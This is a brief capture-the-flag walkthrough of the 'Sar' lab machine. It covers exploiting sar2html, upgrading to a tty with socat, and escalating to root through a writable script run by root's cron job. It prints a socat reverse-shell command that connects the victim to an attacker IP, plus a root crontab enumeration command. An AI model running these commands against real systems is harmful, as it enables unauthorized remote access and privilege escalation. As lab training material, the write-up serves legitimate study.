# PG Play - Sar
## Author: Love Sharma
### Released on:Jul 20, 2020


This is not a conventional foothold-privesc type of machine. Only proof.txt is a valid flag.


Target: 192.168.246.35


Nmap found port 80 opened then found this sar2html in robots.txt



Found exploit for sar2html



echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin


/usr/sbin

Didn't have a tty shell so found a 
Tested a few different types, php, python, nc (no -e because of version issue but the nc tty without a -e didn't work either) the one that worked was a socat used below commands


On Kali (listen):

1
socat file:`tty`,raw,echo=0 tcp-listen:4444
On Victim (launch):

1
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.175:4444

socat once I used the sarhtml exploit to get a dumb shell to convert to a tty



Found with linpeas that I was able to view the crontabs file (/var/spool/cron/crontabs) could have found it with a command after picture though also quicker


cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"


Found that the finally script ran as root from the cron job and all it did was execute the write.sh which I was able to modify, found it horrendous trying to modify in the slow tty shell so I created a new one and tested all the same reverse shells like a dummy that didn't work earlier and realised socat should work since it worked earlier and moved it over with a http server and wget in between the cron jobs and listened on the port 1337 with the same socat listener command used earlier to get a tty shell









